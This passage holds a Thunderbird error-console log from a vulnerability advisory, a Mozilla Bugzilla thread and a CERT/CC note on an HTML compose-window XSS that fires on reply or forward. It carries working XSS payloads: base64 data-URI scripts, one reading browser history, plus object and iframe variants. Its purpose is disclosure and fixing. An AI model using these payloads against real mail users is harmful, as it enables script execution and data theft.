{file: "chrome://messenger/content/messengercompose/messengercompose.xul" line: 0}]
[JavaScript Warning: "XUL box for \_moz\_generated\_content\_before element contained an inline #text child, forcing all its children to be wrapped in a block."
{file: "chrome://messenger/content/messengercompose/messengercompose.xul" line: 0}]
[JavaScript Error: "IndexSizeError: Index or size is negative or greater than the allowed amount" {file: "chrome://messenger/content/glodaFacetBindings.xml"
line: 1736}]
[JavaScript Error: "IndexSizeError: Index or size is negative or greater than the allowed amount" {file: "chrome://messenger/content/glodaFacetBindings.xml"
line: 1736}]
[JavaScript Warning: "XUL box for \_moz\_generated\_content\_before element contained an inline #text child, forcing all its children to be wrapped in a block."
{file: "chrome://messenger/content/folderDisplay.js" line: 2342}]
[JavaScript Warning: "XUL box for \_moz\_generated\_content\_before element contained an inline #text child, forcing all its children to be wrapped in a block."
{file: "chrome://messenger/content/folderDisplay.js" line: 2342}]
[JavaScript Warning: "The character encoding of a framed document was not declared. The document may appear different if viewed without the document framing it."
{file: "data:text/html;base64,PHNjcmlwdD5hbGVydCgiTW96aWxsYS1UaHVuZGVyYmlyZC1TY3JpcHQtQ29kZS1JbmplY3Rpb24tUE9DLUF0ZWVxLUtoYW4iKTs8L3NjcmlwdD4=" line: 0}]
[JavaScript Error: "IndexSizeError: Index or size is negative or greater than the allowed amount" {file: "chrome://messenger/content/glodaFacetBindings.xml"
line: 1736}]
[JavaScript Error: "IndexSizeError: Index or size is negative or greater than the allowed amount" {file: "chrome://messenger/content/glodaFacetBindings.xml"
line: 1736}]
[JavaScript Warning: "The character encoding of a framed document was not declared. The document may appear different if viewed without the document framing it."
{file: "data:text/html;base64,PHNjcmlwdD5hbGVydCgiTW96aWxsYS1UaHVuZGVyYmlyZC1TY3JpcHQtQ29kZS1JbmplY3Rpb24tUE9DLUF0ZWVxLUtoYW4iKTs8L3NjcmlwdD4=" line: 0}]
[JavaScript Warning: "XUL box for \_moz\_generated\_content\_before element contained an inline #text child, forcing all its children to be wrapped in a block."
{file: "chrome://messenger/content/messenger.xul" line: 0}]
[JavaScript Warning: "XUL box for \_moz\_generated\_content\_before element contained an inline #text child, forcing all its children to be wrapped in a block."
{file: "chrome://messenger/content/messenger.xul" line: 0}]
[JavaScript Warning: "XUL box for \_moz\_generated\_content\_before element contained an inline #text child, forcing all its children to be wrapped in a block."
{file: "chrome://messenger/content/folderDisplay.js" line: 1621}]
[JavaScript Warning: "The character encoding of a framed document was not declared. The document may appear different if viewed without the document framing it."
{file: "data:text/html;base64,PHNjcmlwdD5hbGVydCgiTW96aWxsYS1UaHVuZGVyYmlyZC1TY3JpcHQtQ29kZS1JbmplY3Rpb24tUE9DLUF0ZWVxLUtoYW4iKTs8L3NjcmlwdD4=" line: 0}]
[JavaScript Warning: "XUL box for \_moz\_generated\_content\_before element contained an inline #text child, forcing all its children to be wrapped in a block."
{file: "chrome://messenger/content/messengercompose/messengercompose.xul" line: 0}]
[JavaScript Warning: "XUL box for \_moz\_generated\_content\_before element contained an inline #text child, forcing all its children to be wrapped in a block."
{file: "chrome://messenger/content/messengercompose/messengercompose.xul" line: 0}]
[JavaScript Warning: "XUL box for \_moz\_generated\_content\_before element contained an inline #text child, forcing all its children to be wrapped in a block."
{file: "chrome://global/content/bindings/toolbar.xml" line: 276}]
"chrome://global/content/bindings/general.xml" line: 0}]
[JavaScript Warning: "XUL box for \_moz\_generated\_content\_before element contained an inline #text child, forcing all its children to be wrapped in a block."
{file: "chrome://messenger/content/messengercompose/messengercompose.xul" line: 0}]
[JavaScript Warning: "XUL box for \_moz\_generated\_content\_before element contained an inline #text child, forcing all its children to be wrapped in a block."
{file: "chrome://messenger/content/messengercompose/messengercompose.xul" line: 0}]
No chrome package registered for chrome://navigator/content/navigator.xul
[JavaScript Error: "NS\_ERROR\_FAILURE: Component returned failure code: 0x80004005 (NS\_ERROR\_FAILURE) [nsIDOMJSWindow.open]" {file: "data:text/html;base64,
PFNDUklQVD4KdmFyIHdpbiA9IHdpbmRvdy5vcGVuKCk7Cm5ldHNjYXBlLnNlY3VyaXR5LlByaXZpbGVnZU1hbmFnZXIuZW5hYmxlUHJpdmlsZWdlKAogIlVuaXZlcnNhbEJyb3dzZXJBY2Nlc3MiKTsKZm9
yICh2YXIgaT0wOyBpIDwgaGlzdG9yeS5sZW5ndGg7IGkrKykgewogd2luLmRvY3VtZW50LndyaXRlbG4oaGlzdG9yeVtpXSArICI8QlI+Iik7Cn0KbmV0c2NhcGUuc2VjdXJpdHkuUHJpdmlsZWdlTWFuYW
dlci5yZXZlcnRQcml2aWxlZ2UoCiAiVW5pdmVyc2FsQnJvd3NlckFjY2VzcyIpOwp3aW4uY2xvc2UoKTsKPC9TQ1JJUFQ+" line: 2}]
[JavaScript Warning: "XUL box for \_moz\_generated\_content\_before element contained an inline #text child, forcing all its children to be wrapped in a block."
{file: "chrome://messenger/content/messengercompose/messengercompose.xul" line: 0}]
[JavaScript Warning: "XUL box for \_moz\_generated\_content\_before element contained an inline #text child, forcing all its children to be wrapped in a block."
{file: "chrome://messenger/content/messengercompose/messengercompose.xul" line: 0}]
No chrome package registered for chrome://navigator/content/navigator.xul
[JavaScript Error: "NS\_ERROR\_FAILURE: Component returned failure code: 0x80004005 (NS\_ERROR\_FAILURE) [nsIDOMJSWindow.open]" {file: "data:text/html;base64,
PFNDUklQVD4KdmFyIHdpbiA9IHdpbmRvdy5vcGVuKCk7Cm5ldHNjYXBlLnNlY3VyaXR5LlByaXZpbGVnZU1hbmFnZXIuZW5hYmxlUHJpdmlsZWdlKAogIlVuaXZlcnNhbEJyb3dzZXJBY2Nlc3MiKTsKZm9y
ICh2YXIgaT0wOyBpIDwgaGlzdG9yeS5sZW5ndGg7IGkrKykgewogd2luLmRvY3VtZW50LndyaXRlbG4oaGlzdG9yeVtpXSArICI8QlI+Iik7Cn0KbmV0c2NhcGUuc2VjdXJpdHkuUHJpdmlsZWdlTWFuYWdl
ci5yZXZlcnRQcml2aWxlZ2UoCiAiVW5pdmVyc2FsQnJvd3NlckFjY2VzcyIpOwp3aW4uY2xvc2UoKTsKPC9TQ1JJUFQ+" line: 2}]
[JavaScript Error: "An error occurred executing the cmd\_insertHTMLWithDialog command: [Exception... "Could not convert Native argument arg 3
[nsIDOMJSWindow.openDialog]" nsresult: "0x8057000a (NS\_ERROR\_XPC\_BAD\_CONVERT\_NATIVE)" location: "JS frame :: chrome://editor/content/ComposerCommands.js
:: <TOP\_LEVEL> :: line 2790" data: no]" {file: "chrome://global/content/globalOverlay.js" line: 95}]
[JavaScript Warning: "XUL box for \_moz\_generated\_content\_before element contained an inline #text child, forcing all its children to be wrapped in a block."
{file: "chrome://messenger/content/messengercompose/messengercompose.xul" line: 0}]
Security Error: Content at moz-nullprincipal:{37db781d-d6d3-44bb-ade4-a79dcc63c0dd} may not load or link to about:blank.
Security Error: Content at moz-nullprincipal:{44bab10a-4bd8-4cfb-a519-eb2535344039} may not load or link to about:blank
[JavaScript Error: "[Exception... "'DB failed getting form autocomplete values' when calling method: [nsIFormAutoComplete::autoCompleteSearch]"
nsresult: "0x8057001e (NS\_ERROR\_XPC\_JS\_THREW\_STRING)" location: "<unknown>" data: no]"]
[JavaScript Error: "aSubject.popup is undefined" {file: "resource:///modules/glodaWebSearch.js" line: 68}]
[JavaScript Warning: "The stylesheet data:,\*%7bx:<script>alert(1)</script>askjn</h1>expression(write(2))%7D was loaded as CSS even though its MIME type,
"text/plain", is not "text/css"." {file: "about:blank" line: 0}]
[JavaScript Warning: "Unknown property 'x'. Declaration dropped." {file: "data:,\*%7bx:<script>alert(1)</script>askjn</h1>expression(write(2))%7D" line: 1]
[JavaScript Error: "GenericSendMessage FAILED: [Exception... "Component returned failure code: 0x8055311a [nsIMsgCompose.SendMsg]"
nsresult: "0x8055311a (<unknown>)" location: "JS frame :: chrome://messenger/content/messengercompose/MsgComposeCommands.js :: GenericSendMessage ::
line 2814" data: no]" {file: "chrome://messenger/content/messengercompose/MsgComposeCommands.js" line: 2817}]
"chrome://messenger/content/messengercompose/messengercompose.xul" line: 0}]
[JavaScript Warning: "Use of attributes' nodeValue attribute is deprecated. Use value instead."
{file: "chrome://messenger/content/messengercompose/MsgComposeCommands.js" line: 3996}]
Security Error: Content at moz-nullprincipal:{549c3f5a-560d-4469-9b0f-09f598998b0b} may not load or link to about:blank.
Security Error: Content at moz-nullprincipal:{63e416e7-9cc4-458f-b93d-882bb2ad9121} may not load or link to about:blank.
[JavaScript Warning: "XUL box for \_moz\_generated\_content\_before element contained an inline #text child, forcing all its children to be wrapped in a block."
{file: "chrome://global/content/bindings/general.xml" line: 0}]
[JavaScript Error: "Search service falling back to synchronous initialization at SRCH\_SVC\_\_ensureInitialized@resource:///components/nsSearchService.js:2498
@resource:///components/nsSearchService.js:3476
\_adjustAcItem@chrome://messenger/content/webSearch.xml:42
@chrome://messenger/content/webSearch.xml:22
-----------------------------------------------------------------------------
[JavaScript Warning: "The stylesheet data:,\*%7bx:<script>alert(1)</script>askjn</h1>expression(write(2))%7D
was loaded as CSS even though its MIME type, "text/plain", is not "text/css"." {file: "about:blank" line: 0}]
stylesheet was loaded successfully as text/plain even though it should have been.
Risk:
=====
The security risk of the persistent input validation vulnerabilities are estimated as medium(+).
Credits:
========
Ateeq Khan - CCURE IT (ateek.khan@gmail.com) - (Communication: admin@vulnerability-lab.com)
Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases or trade with fraud/stolen material.
Domains: www.vulnerability-lab.com - www.vuln-lab.com - www.vulnerability-lab.com/register
Contact: admin@vulnerability-lab.com - support@vulnerability-lab.com - research@vulnerability-lab.com
Section: video.vulnerability-lab.com - forum.vulnerability-lab.com - news.vulnerability-lab.com
Social: twitter.com/#!/vuln\_lab - facebook.com/VulnerabilityLab - youtube.com/user/vulnerability0lab
Feeds: vulnerability-lab.com/rss/rss.php - vulnerability-lab.com/rss/rss\_upcoming.php - vulnerability-lab.com/rss/rss\_news.php
Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),
modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.
Copyright © 2013 | Vulnerability Laboratory

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=875818#a16_280903)• 12 years ago |

Flags: sec-bounty?

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=875818#c1)• 12 years ago |
|  | |

Attached image
[Image of PoC functioning](attachment.cgi?id=753844)
— [Details](attachment.cgi?id=753844&action=edit)

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=875818#c2)• 12 years ago |
|  | |

Attached image
[Thunderbird error console during PoC](attachment.cgi?id=753845)
— [Details](attachment.cgi?id=753845&action=edit)

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903)  Reporter |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=875818#c3)• 12 years ago |
|  | |

Attached image
[Image of debugger raw logs during PoC](attachment.cgi?id=753846)
— [Details](attachment.cgi?id=753846&action=edit)

|  | [Mark Banner (:standard8)](/user_profile?user_id=112088) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=875818#c4)• 12 years ago |
|  | |

This is a duplicate of [bug 868267](/show_bug.cgi?id=868267 "RESOLVED FIXED - HTML mail compose self-XSS due to signature text"), there's a few more test cases, but really they are all the same result.
I guess my only concern would be to ensure we've covered the svg case when we fix that bug.

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903)  Reporter |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=875818#c5)• 12 years ago |
|  | |

Can we dupe this or otherwise make a dependency since this is an open security issue?Keywords: [sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=875818#c6)• 12 years ago |
|  | |

I don't know what the bug summary means so I'm changing it. Where does Base URI come into this anywhere?
(In reply to Al Billings [:abillings] from [comment #5](/show_bug.cgi?id=875818#c5 "RESOLVED FIXED - HTML compose window XSS via <object> tag on Reply/Forward (\"wiretap\" is back)"))
> Can we dupe this or otherwise make a dependency since this is an open
> security issue?
There are multiple issues described in this bug which means potentially multiple resolutions. That obviously can't be handled in a single bug so maybe we need to treat this as a tracker bug and split out bugs for each separate issue.
[bug 868267](/show_bug.cgi?id=868267 "RESOLVED FIXED - HTML mail compose self-XSS due to signature text") is strictly about self-XSS due to the signature text. That seems to match Poc2 and Poc3.
That misses the main claim of this bug that if you send this mail to a victim "if the victim clicks on Reply or Forward, the exploit gets executed successfully." PoC #1 makes no mention of the signature file and it's a different, more serious, bug. This means the old "wiretap" flaws have come back like [bug 66938](/show_bug.cgi?id=66938 "VERIFIED FIXED - Eavesdropping on mail messages using innerHTML (wiretap)") etc.
<https://bugzilla.mozilla.org/buglist.cgi?quicksearch=FIX+wiretap>
I have tested this and the claim is accurate.
Important caveat: the victim must be using HTML compose. This is the default so not a hard condition in a real attack, but I know plain text is popular with engineers and you'll miss this bug if you test with plain-text compose windows.
In the "Forward" case the victim must forward "in-line", it does not work if you forward "as attachment". The former (vulnerable) setting is also the default.
The reporter's guess about base64 escaping filtering appears inaccurate, changing payload 1 to
<object data="data:text/html,<script>alert(1)</script>"></object>
seems to work just as well. In addition to <object> and <embed> we also have this problem with
<iframe src="data:text/html,<script>alert(1)</script>"><iframe>
I thought we disabled Javascript at the docshell level so I don't understand how this could work. Or maybe we do on the viewing pane (which is why scripts don't run there) but can't in an editor? If we're truly relying on filtering I bet there's a lot more problems here.Summary: Base URI Filter Bypass & Persistent Script Code Injection Vulnerability → HTML compose window XSS via <object> tag on Reply/Forward ("wiretap" is back)

|  | [Benjamin Kunz Mejri](/user_profile?user_id=471647) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=875818#c7)• 12 years ago |
|  | |

"The reporter's guess about base64 escaping filtering appears inaccurate, changing payload 1 to .."
Yes we will also include that to the report. Much thanks for the verification and coordination of the product issue ... we will soon continue. ~bkm

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=875818#c8)• 12 years ago |
|  | |

> I thought we disabled Javascript at the docshell level so I don't understand how this
> could work
First question: which Gecko version are we talking about here? There were recent m-c changes to disabling JS in designMode documents (to NOT disable it) that might perhaps be relevant... But the report is against Gecko 17, right?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=875818#c10)• 12 years ago |
|  | |

I confirmed this in a release Thunderbird, so yes, that's Gecko 17.
Raising the severity because it could affect any Thunderbird recipient with default settings. All the attacker needs is to write something inflammatory or viral enough to get the victim to reply or forward. The value of what you could steal that way is probably small most of the time but users will not see it that way.Flags: sec-bounty? → sec-bounty+Keywords: [sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---) → [sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=875818#c11)• 12 years ago |
|  | |

> Report-Timeline:
> ================
> 2013-05-10: Researcher Notification & Coordination (Ateeq Khan)
> 2013-05-11: Vendor Notification (Mozilla - Security Incident Team)
The Mozilla security team did not receive mail about this vulnerability until 2013-05-21 12:08 local time.
> [bug 868267](/show_bug.cgi?id=868267 "RESOLVED FIXED - HTML mail compose self-XSS due to signature text") is strictly about self-XSS due to the signature text.
> That seems to match Poc2 and Poc3.
Oops, I missed [bug 868267 comment 15](/show_bug.cgi?id=868267#c15 "RESOLVED FIXED - HTML mail compose self-XSS due to signature text") from Mark that describes this bug. It was filed a few hours before mail about this bug was sent to us. We're awarding a split bug bounty for this one.

|  | [Benjamin Kunz Mejri](/user_profile?user_id=471647) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=875818#c12)• 12 years ago |
|  | |

Thanks for all the cooperation and coordination. It is a totally fair decision to split the bug bounty reward because we detected the core problem with the effects around and the other researcher detected only a part of the issue in the signature like discussed ago. Good job and absolutly fair decision! We really like the transparent coordination via bugzilla.
Best Regards,
Vulnerability Research Laboratory,
Benjamin Kunz Mejri & Ateeq Khan

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=875818#c13)• 12 years ago |
|  | |

Is there anybody who can fix this?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=875818#c15)• 12 years ago |
|  | |

This bug is not in the compose window UI but in the core composition code itself.Component: Message Compose Window → CompositionProduct: Thunderbird → MailNews Core

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=875818#a2854216_1689)• 12 years ago |

Alias: wiretap

|  | [Ludovic Hirlimann [:Usul]](/user_profile?user_id=99100) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=875818#c17)• 12 years ago |
|  | |

We probably should try to fix it before 24 is released. Setting the tracking flag.
[tracking-thunderbird24](/buglist.cgi?f1=cf_tracking_thunderbird24&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_thunderbird24&o1=equals&v1=%3F)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=875818#a5286951_1689)• 12 years ago |

Blocks: [897639](/show_bug.cgi?id=897639 "RESOLVED DUPLICATE - self-xss in thunderbird :: new mail filter")

|  | [Mark Banner (:standard8)](/user_profile?user_id=112088) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=875818#c18)• 12 years ago |
|  | |

(In reply to Boris Zbarsky (:bz) from [comment #8](/show_bug.cgi?id=875818#c8 "RESOLVED FIXED - HTML compose window XSS via <object> tag on Reply/Forward (\"wiretap\" is back)"))
> > I thought we disabled Javascript at the docshell level so I don't understand how this
> > could work
>
> First question: which Gecko version are we talking about here? There were
> recent m-c changes to disabling JS in designMode documents (to NOT disable
> it) that might perhaps be relevant... But the report is against Gecko 17,
> right?
I've just done some retesting of what I'd originally done in [bug 868267](/show_bug.cgi?id=868267 "RESOLVED FIXED - HTML mail compose self-XSS due to signature text"). This bug does not seem to affect TB 23/24/25. It does affect TB 17.
afaict in all cases the docshell is getting the allowJavascript attribute set to false.
[status-thunderbird23](/buglist.cgi?f1=cf_status_thunderbird23&o1=isnotempty):
--- → [unaffected](/buglist.cgi?f1=cf_status_thunderbird23&o1=equals&v1=unaffected)
[status-thunderbird24](/buglist.cgi?f1=cf_status_thunderbird24&o1=isnotempty):
--- → [unaffected](/buglist.cgi?f1=cf_status_thunderbird24&o1=equals&v1=unaffected)
[status-thunderbird25](/buglist.cgi?f1=cf_status_thunderbird25&o1=isnotempty):
--- → [unaffected](/buglist.cgi?f1=cf_status_thunderbird25&o1=equals&v1=unaffected)
[status-thunderbird-esr17](/buglist.cgi?f1=cf_status_thunderbird_esr17&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_thunderbird_esr17&o1=equals&v1=affected)
[tracking-thunderbird24](/buglist.cgi?f1=cf_tracking_thunderbird24&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_thunderbird24&o1=equals&v1=%3F) → [-](/buglist.cgi?f1=cf_tracking_thunderbird24&o1=equals&v1=-)

|  | [Mark Banner (:standard8)](/user_profile?user_id=112088) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=875818#a6296783_112088)• 11 years ago |

Blocks: [CVE-2013-6674](/show_bug.cgi?id=868267 "RESOLVED FIXED - HTML mail compose self-XSS due to signature text")

|  | [Mark Banner (:standard8)](/user_profile?user_id=112088) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=875818#c22)• 11 years ago |
|  | |

bz: do you have any ideas on where to look for something that might be back-portable to ESR 17, or otherwise easy fix? See also [comment 18](/show_bug.cgi?id=875818#c18 "RESOLVED FIXED - HTML compose window XSS via <object> tag on Reply/Forward (\"wiretap\" is back)").Flags: needinfo?(bzbarsky)

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=875818#c23)• 11 years ago |
|  | |

Not offhand. Worth bisecting (at least on nightlies) to figure out what fixed this?Flags: needinfo?(bzbarsky)

|  | [Mark Banner (:standard8)](/user_profile?user_id=112088) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=875818#c24)• 11 years ago |
|  | |

Now Thunderbird 17.0.x series is obsolete and updates have been offered to TB 17esr users, I have re-tested Thunderbird 24.0.x and it is still unaffected by this issue. Therefore resolving this as WFM.
It would still have been nice to figure out what broke/fixed this, but this is no longer an issue.Status: NEW → RESOLVEDClosed: 11 years ago
[status-thunderbird-esr17](/buglist.cgi?f1=cf_status_thunderbird_esr17&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_thunderbird_esr17&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_thunderbird_esr17&o1=equals&v1=wontfix)Resolution: --- → WORKSFORME

|  | [Benjamin Kunz Mejri](/user_profile?user_id=471647) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=875818#c25)• 11 years ago |
|  | |

Hello Mozilla Security Team,
Just wanted to know if this vulnerability has been patched completely. From the comments and current status we assume the bug has been patched.
Best Regards,
Ateeq Khan
Sr Manager PT
Evolution Security (Vulnerability Labs)
<http://evolution-sec.com>

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=875818#c26)• 11 years ago |
|  | |

Ateeq: this is patched in Thunderbird 24.x. Thunderbird 17.x was not patched but is no longer supported.

|  | [chris hofmann](/user_profile?user_id=2687) |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=875818#c27)• 11 years ago |
|  | |

when bugs like this get marked "works for me" they don't get on the radar for vulnerability notices, and atleast proper credit for discovery of the problem.
probably should be marked as fixed and we should follow up in publishing a vuln notice with the next batch, or we need to expand the query for catching bugs for vuln notes.
could also be time to also open up this bug since details have been posted in several places.
Mozilla Bug Bounty #5 - WireTap Remote Web Vulnerability - <http://seclists.org/bugtraq/2014/Jan/103>
Vuln: Mozilla Thunderbird Remote Security Bypass Vulnerability - <http://www.securityfocus.com/bid/65158>
Bugtraq: Mozilla Bug Bounty #5 - WireTap Remote Web Vulnerability - <http://www.securityfocus.com/archive/1/530893>Resolution: WORKSFORME → FIXED

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=875818#a21531605_280903)• 11 years ago |

Whiteboard: [CVE-2013-6674 in bug 868267]

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903)  Reporter |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=875818#c28)• 11 years ago |
|  | |

Opening up this bug since it has been fixed for some time and is being discussed publicly.Group: core-security

|  | [Benjamin Smedberg](/user_profile?user_id=7044) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=875818#a23583597_7044)• 11 years ago |

Restrict Comments: true

|  | [Benjamin Smedberg](/user_profile?user_id=7044) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=875818#a24637605_7044)• 11 years ago |

Restrict Comments: false

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=875818#a347668162_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=875818&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.vulnerability-lab.com_ad98274f_20250124_194459.html ===


--



=== Content from www.kb.cert.org_2d619ef4_20250124_194458.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#863369

## Mozilla Thunderbird does not adequately restrict HTML elements in email message content

#### Vulnerability Note VU#863369

Original Release Date: 2014-01-27 | Last Revised: 2014-01-28

---

### Overview

Mozilla Thunderbird does not adequately restrict HTML elements in email content, which could allow an attacker to execute arbitrary script when a specially-crafted email message is forwarded or replied to.

### Description

| Vulnerability Lab has reported a vulnerability in the way Mozilla Thunderbird handles HTML elements in email content. Mozilla Thunderbird blocks the creation of certain HTML elements, such as script, when displaying email messages. Traditionally, a script element is created through the use of a <script> HTML tag. HTML elements, including script, can also be created through the use of an <object> tag that specifies a [Data URI](https://developer.mozilla.org/en-US/docs/data_URIs) scheme ([RFC 2397](http://tools.ietf.org/html/rfc2397)). The Data URI can specify a text/html mime type and encode the script in base64. In such cases, Thunderbird will execute the script contained in the email message when it is forwarded or replied to and the outgoing message is in HTML format. Simply displaying the email message does not appear to cause the script to execute.  See [Mozilla Bug Bounty #5 - WireTap Remote Web Vulnerability](http://www.vulnerability-lab.com/get_content.php?id=953) for more details.Testing indicates that Thunderbird 17.0.{6,7,8} are vulnerable. Earlier versions may also be vulnerable. |
| --- |

### Impact

| By creating a specially-crafted email message, an attacker can cause arbitrary script to execute in Thunderbird when that message is forwarded or replied to. |
| --- |

### Solution

| **Apply an update**Limited testing has shown that Thunderbird versions 24.0 and later are not affected by this vulnerability. |
| --- |

| **Compose email in plain text format**Disabling the setting to "Compose messages in HTML format" for each email account will help protect against attacks. This will cause outgoing messages to be constructed in plain text, which does not contain HTML elements. |
| --- |

### Vendor Information

863369
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

 Sort by:
Status
Alphabetical

Expand all

**Javascript is disabled. Click [here](/vuls/vendor/VU%23863369/) to view vendors.**
### [Mozilla](#AAMN-9FRULH) Affected

Updated:  January 27, 2014

### Status

Affected

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

We are not aware of further vendor information regarding this vulnerability.

### CVSS Metrics

| Group | Score | Vector |
| --- | --- | --- |
| Base | 5 | AV:N/AC:L/Au:N/C:N/I:P/A:N |
| Temporal | 3.9 | E:POC/RL:OF/RC:C |
| Environmental | 2.9 | CDP:ND/TD:M/CR:ND/IR:ND/AR:ND |

### References

* <http://www.vulnerability-lab.com/get_content.php?id=953>
* <https://developer.mozilla.org/en-US/docs/data_URIs>
* <http://tools.ietf.org/html/rfc2397>
### Acknowledgements

This vulnerability was reported by Vulnerability Laboratory, who in turn credits Ateeq ur Rehman Khan.

This document was written by Art Manion and Will Dormann.

### Other Information

| **CVE IDs:** | [CVE-2013-6674](http://web.nvd.nist.gov/vuln/detail/CVE-2013-6674) |
| --- | --- |
| **Date Public:** | 2014-01-27 |
| **Date First Published:** | 2014-01-27 |
| **Date Last Updated:** | 2014-01-28 22:46 UTC |
| **Document Revision:** | 26 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

